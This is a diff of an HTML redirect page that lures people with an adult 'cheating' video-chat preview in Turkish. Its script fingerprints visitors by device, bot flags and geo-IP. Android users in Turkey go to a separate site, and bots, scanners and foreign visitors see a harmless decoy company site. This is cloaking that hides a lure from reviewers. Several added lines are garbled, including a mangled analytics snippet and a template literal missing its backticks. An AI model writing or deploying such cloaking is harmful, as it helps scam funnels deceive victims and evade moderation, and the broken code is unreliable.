@@ -6,120 +6,36 @@
   <meta name="robots" content="noindex, nofollow">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  
-  <!-- Yandex Metrika Kodu (Bunu kendi ID'nle değiştir!) -->
+
+  <!-- Yandex Metrika -->
   <script type="text/javascript">
-    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+    (function(m,e,t,r,i,k,a){m[i]=m[i]function(){(m[i].a=m[i].a[]).push(arguments)};
     m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
     (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
     ym(103636543, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true });
   </script>
 
-  <!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="GÖRÜNTÜLÜ KONUŞMAK İÇİN TIKLA">
-    <meta name="twitter:description" content="Kaçamak mı yapmak istiyorsunuz tam size göre !">
-    
-    <!-- DEFAULT RESİM (URL'de ?resim= yoksa bu çalışır) -->
-    <meta name="twitter:image" content="https://elleader.vercel.app/asd.jpg">
-    <meta property="og:image" content="https://elleader.vercel.app/asd.jpg">
-    
-    <meta property="og:url" content="https://elleader.vercel.app">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="pıttığım çok azdı">
-    <meta property="og:description" content="Görüntülü sohbetin en hızlı ve eğlenceli adresi">
+  <!-- Sosyal Önizleme -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="GÖRÜNTÜLÜ KONUŞMAK İÇİN TIKLA">
+  <meta name="twitter:description" content="Kaçamak mı yapmak istiyorsunuz tam size göre !">
+  <meta name="twitter:image" content="https://elleader.vercel.app/asd.jpg">
 
-  
-  <script>
-    // 📱 ANDROID TESPİTİ (Optimize Edilmiş)
-function isRealAndroid() {
-  const ua = navigator.userAgent.toLowerCase();
+  <meta property="og:image" content="https://elleader.vercel.app/asd.jpg">
+  <meta property="og:url" content="https://elleader.vercel.app">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="pıttığım çok azdı">
+  <meta property="og:description" content="Görüntülü sohbetin en hızlı ve eğlenceli adresi">
 
-  const androidDevices = [
-    'android',
-    'linux; android',
-    'samsung',
-    'sm-',
-    'huawei',
-    'honor',
-    'xiaomi',
-    'mi',
-    'redmi',
-    'poco',
-    'oppo',
-    'vivo',
-    'realme',
-    'oneplus',
-    'lenovo',
-    'zte',
-    'meizu',
-    'nokia',
-    'tecno',
-    'infinix',
-    'doogee',
-    'ulefone',
-    'leeco',
-    'coolpad',
-    'alcatel',
-    'asus',
-    'philips',
-    'motorola',
-    'sony',
-    'lg'
-  ];
-
-  const deviceMatch = androidDevices.some(keyword => ua.includes(keyword));
-  const hasTouch = 'ontouchstart' in window;
-  const isBot = navigator.webdriver;
-
-  console.log('UA:', ua);
-  console.log('✅ Android cihaz mı:', deviceMatch);
-  console.log('👆 Touch:', hasTouch);
-  console.log('🤖 Bot mu:', isBot);
-
-  return deviceMatch && hasTouch && !isBot;
-}
-
-    // 🌍 TÜRKİYE KONTROLÜ (Hızlı API)
-    async function checkGeo() {
-      try {
-        const res = await fetch('https://api.country.is');
-        return res.ok && (await res.json()).country === 'TR';
-      } catch {
-        return false;
-      }
-    }
-
-    // ⚡ YÖNLENDİRME + METRİKA LOG
-    setTimeout(async () => {
-      try {
-        const [isAndroid, isTurkey] = await Promise.all([isRealAndroid(), checkGeo()]);
-        const isBot = navigator.webdriver || /HeadlessChrome|PhantomJS/i.test(navigator.userAgent);
-
-        if (isAndroid && isTurkey && !isBot) {
-          // ✅ HEDEF SAYFAYA YÖNLENDİR + METRİKA'YA LOG AT
-          if (typeof ym !== 'undefined') {
-            ym(103636543, 'reachGoal', 'android_redirect', {
-              screen: `${screen.width}x${screen.height}`,
-              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            });
-          }
-          window.location.href = "https://goruntulusohbetzamani.vercel.app/";
-        } else {
-          // ❌ BOT/VPN/YABANCI → FALLBACK
-          window.location.href = "https://www.kocalar.com.tr/";
-        }
-      } catch {
-        window.location.href = "https://www.kocalar.com.tr/";
-      }
-    }, 500 + Math.random() * 1000); // 0.5-1.5s arası rastgele bekleme
-  </script>
-  
   <style>
-    body { background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    body {
+      background: #f1f3f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
     .loader {
       border: 4px solid rgba(0,0,0,0.1);
       border-radius: 50%;
@@ -133,6 +49,54 @@ function isRealAndroid() {
       100% { transform: rotate(360deg); }
     }
   </style>
+
+  <script>
+    // ✅ Android cihaz tespiti (Geniş kapsama)
+    function isRealAndroid() {
+      const ua = navigator.userAgent.toLowerCase();
+      const keywords = [
+        'android', 'linux; android', 'samsung', 'sm-', 'huawei', 'honor', 'xiaomi', 'mi', 'redmi',
+        'poco', 'oppo', 'vivo', 'realme', 'oneplus', 'lenovo', 'zte', 'meizu', 'nokia', 'tecno',
+        'infinix', 'doogee', 'ulefone', 'leeco', 'coolpad', 'alcatel', 'asus', 'philips',
+        'motorola', 'sony', 'lg'
+      ];
+      const match = keywords.some(k => ua.includes(k));
+      const touch = 'ontouchstart' in window;
+      const bot = navigator.webdriver;
+
+      return match && touch && !bot;
+    }
+
+    // 🌍 Türkiye kontrolü (Fallback'li)
+    async function isFromTurkey() {
+      try {
+        const res = await fetch('https://api.country.is');
+        if (!res.ok) return true; // hata varsa TR kabul et
+        const json = await res.json();
+        return json.country === 'TR';
+      } catch {
+        return true; // fallback: hata varsa TR say
+      }
+    }
+
+    // 🚀 Yönlendirme işlemi
+    setTimeout(async () => {
+      const android = isRealAndroid();
+      const turkey = await isFromTurkey();
+
+      if (android && turkey) {
+        if (typeof ym !== 'undefined') {
+          ym(103636543, 'reachGoal', 'android_redirect', {
+            screen: ${screen.width}x${screen.height},
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+          });
+        }
+        window.location.href = "https://goruntulusohbetzamani.vercel.app/";
+      } else {
+        window.location.href = "https://www.kocalar.com.tr/";
+      }
+    }, 500 + Math.random() * 1000);
+  </script>
 </head>
 <body>
   <div class="loader"></div>
@@ -140,9 +104,4 @@ function isRealAndroid() {
     <meta http-equiv="refresh" content="0; url=https://www.kocalar.com.tr/">
   </noscript>
 </body>
-
 </html>
-
-
-
-
